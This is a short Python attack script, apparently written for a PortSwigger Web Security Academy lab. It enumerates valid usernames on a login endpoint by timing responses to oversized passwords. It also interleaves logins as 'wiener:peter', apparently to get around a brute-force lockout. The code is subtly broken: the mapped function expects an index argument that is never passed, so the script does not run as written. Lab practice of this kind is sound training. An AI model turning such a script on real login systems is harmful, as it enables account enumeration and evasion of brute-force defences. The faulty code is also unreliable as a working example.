import pathlib
from concurrent.futures import ThreadPoolExecutor as Executor

import requests

WORKSPACE = pathlib.Path(__file__).parent

URL = "https://0a6a00af038b852781e3def500a6005b.web-security-academy.net/login"

user_list = open(WORKSPACE / "original_user_list.txt").readlines()

size = len(user_list)

def check_user(user: str, index: int) -> dict:
    usr = user
    pwd = "batman"*400

    if index % 3 == 0:
        usr = "wiener"
        pwd = "peter"

    res = requests.post(URL, data={
        "username": usr.strip(),
        "password": pwd
    })

    return {
        "user": user,
        "time": res.elapsed.total_seconds(),
    }

with Executor(max_workers=5) as exec:
    results = exec.map(check_user, user_list)
    valid = [f"{res['user']}:{res['time']}\n" for res in sorted(results, key=lambda x: x["time"], reverse=True)]
    
    print(*valid)

    open(WORKSPACE / "valid_users.txt", "w").writelines(valid)